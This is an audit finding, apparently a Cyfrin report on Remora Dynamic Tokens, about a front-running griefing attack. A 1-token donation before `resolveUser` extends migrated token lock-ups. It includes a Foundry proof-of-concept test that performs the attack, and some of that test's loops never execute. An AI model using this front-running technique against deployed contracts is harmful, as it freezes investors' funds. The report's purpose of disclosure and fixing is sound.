---
tags:
  - lang/solidity
  - sector/governance
  - sector/stable
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/dos/griefing
  - novelty/variant
protocol: "[[Remora]]"
auditors:
  - "[[0xStalin]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md"
genome:
  - "[[griefing]]"
  - "[[temporary]]"
  - "[[variant]]"
  - "[[dos-resistance]]"
  - "[[frontrun-exposure]]"
  - "[[timestamp-dependence]]"
---
# Migrating the existing locks for an investor when is resolved can be gamed causing the existing locks to last longer than they should

- id: 63779
- impact: HIGH
- protocol: [[Remora]] Dynamic Tokens
- reporter: 0xStalin (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md

## Summary


This bug report discusses a problem where the existing locks on a user's old address are not correctly migrated to their new address when resolving an investor. This can be exploited by a griefing attack, where a donation is made to the new address before resolving the old address, causing the migrated tokens to be locked for a longer duration. This issue can be mitigated by refactoring the logic for migrating locks to ensure they are correctly ordered. The bug has been fixed in the code and verified by a third-party.

## Details

**Description:** When resolving an investor, the existing locks on the `oldAddress` are migrated to the `newAddress` by appending the locks from the `oldAddress` right at the end of the existing locks on the `newAddress`.
```solidity
    function _newAccountSameLocks(address oldAddress, address newAddress) internal {
        ...
//@audit => locks from `oldAddress` are appended after the existing locks of the `newAddress`
        uint16 len = oldData.endInd - oldData.startInd;
        for (uint16 i = 0; i < len; ++i) {
@>          newData.tokenLockUp[newData.endInd++] = oldData.tokenLockUp[
                oldData.startInd + i
            ];
        }
        newData.tokensLocked += oldData.tokensLocked;

        // reset old user data
        delete $._userData[oldAddress];
    }
```

The algorithm to unlock tokens as the locks surpass the `lockUpTime` and the algorithm to calculate the available tokens both stop iterating over the user's `tokenLockUps` as soon as a lock-up that has not expired is found.
```solidity
//LockUpManager.sol//

    function _unlockTokens(
        address holder,
        uint256 amount,
        bool disregardTime // used by admin actions
    ) internal returns (uint32 amountUnlocked) {
        ...
        for (uint16 i = userData.startInd; i < len; ++i) {
            // if not disregarding time, then check if the lock up time
            // has been served; if not break out of loop
//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
            if (
                !disregardTime &&
@>              curTime - userData.tokenLockUp[i].time < lockUpTime
            ) break;

            // if here means this lockup has been served & can be unlocked
            uint32 curEntryAmount = userData.tokenLockUp[i].amount;

            ...
        }

function availableTokens(
    address holder
) public view returns (uint256 tokens) {
    ...
    for (uint16 i = userData.startInd; i < len; ++i) {
        LockupEntry memory curEntry = userData.tokenLockUp[i];
        if (curTime - curEntry.time >= lockUpTime) {
            tokens += curEntry.amount;
//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
        } else {
@>          break;
        }
    }
}
        ...
    }

```

The combination of how the tokens are migrated when resolving an investor and the algorithm's short-circuit as soon as a lock-up that has not expired is found, allows for a griefing attack where the tx to resolve an investor is frontran and 1 ChildToken is donated to the `newAddress`, the `ChildToken::resolveUser` function will migrate tokens to.
- The donation will create a lock on the `newAddress` for the entire `lockUpDuration`. This lock will be the first lock of the `newAddress`, which means all the existing tokens from the `oldAddress` will be appended **after** that new lock. In other words, all existing locks at the `oldAddress` will remain locked until the new lock reaches the `lockUpDuration`, regardless of whether the `lockUpDuration` for those locks has already been met.


**Impact:** Existing lock durations can be gamed, forcing the locks on the newAddress to last longer than they should

**Proof of Concept:** Add the next PoC to `ChildTokenAdminTest.t.sol` test file.
The PoC demonstrates:
1. Resolving users should preserve the existing locks on the `oldUser` (When the attack is not performed)
2. The migrated tokens on the `newUser` get locked for a longer duration if the attack is performed.
```solidity
    function test_GrieffAttacToExtendLocksWhenResolving() public {
        uint32 DEFAULT_LOCK_TIME = 365 days;
        uint32 QUART_LOCKTIME = DEFAULT_LOCK_TIME / 4;

        address oldUser = getDomesticUser(1);
        address newUser = getDomesticUser(2);
        address extraInvestor = getDomesticUser(3);

        centralTokenProxy.mint(address(this), uint64(2));
        centralTokenProxy.dynamicTransfer(extraInvestor, 2);

        vm.warp(DEFAULT_LOCK_TIME);

        centralTokenProxy.mint(address(this), uint64(4));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        // Distribute payout!
        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);
        paySettlerProxy.distributePayment(address(centralTokenProxy), address(this), 300); // 300 USD(6) total

        vm.warp(block.timestamp + QUART_LOCKTIME);
        centralTokenProxy.mint(address(this), uint64(1));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        centralTokenProxy.mint(address(this), uint64(1));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        centralTokenProxy.mint(address(this), uint64(1));
        centralTokenProxy.dynamicTransfer(oldUser, 1);

        uint256 snapshot1 = vm.snapshot();
            //@audit-info => Validate each 3 months a new token would've been unlocked!
            for(uint8 i = 1; i == 4; i++) {
                vm.warp(block.timestamp + (QUART_LOCKTIME * i));
                assertEq(d_childTokenProxy.availableTokens(oldUser),i);
            }
        vm.revertTo(snapshot1);


        //@audit-info => Resolving the oldUser without the grieffing attack being executed!
        d_childTokenProxy.resolveUser(oldUser, newUser);

        //@audit-info => Validate each 3 months a new token would've been unlocked, even after the resolve, locks remains as they are
        for(uint8 i = 1; i == 4; i++) {
            vm.warp(block.timestamp + (QUART_LOCKTIME * i));
            assertEq(d_childTokenProxy.availableTokens(oldUser),i);
        }


        vm.revertTo(snapshot1);

        assertEq(d_childTokenProxy.availableTokens(oldUser),0);

        //@audit => Frontruns resolveUser
        vm.prank(extraInvestor);
        d_childTokenProxy.transfer(newUser, 1);

        d_childTokenProxy.resolveUser(oldUser, newUser);

        //@audit-issue => Because of the donation prior to resolveUser() was executed, the locks for the migrated tokens are messed up and all the tokens are extended until the lock of the donated token is over!
        //@audit-issue => Migrated tokens from oldUser are locked for an entire year
        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser),0);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser),0);

        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser),0);

        //@audit-issue => Only until the donated tokens is unlocked, so are all the migrated tokens
        vm.warp(block.timestamp + QUART_LOCKTIME);
        assertEq(d_childTokenProxy.availableTokens(newUser), 5);
    }
```

**Recommended Mitigation:** Consider refactoring the logic to migrate the locks from the `oldAddress` to the `newAddress`, so that they are not simply appended to the end of the existing locks. Instead, iterate over the existing locks and compare the `tokenLockup.time` to reorder them so that the times of all the locks are correctly ordered sequentially based on the time. This will allow the existing locks on the `oldAddress` to correctly release the tokens on the `newAddress` as soon as they expire.

**Remora:** Fixed at commit [3d6d874](https://github.com/remora-projects/remora-dynamic-tokens/commit/3d6d87430bbabb16afce37e5cbfe968093fc2d24).

**Cyfrin:** Verified. Refactored `ChildToken::resolveUser` to transfer the signatures from the `oldAddress` to the `newAddress` instead of requiring the `newAddress` to have signed all the documents before resolving the `oldAddress`. This change prevents the `newAddress` from receiving any `ChildToken`, therefore, there won't be any existing locks on the `newAddress`.
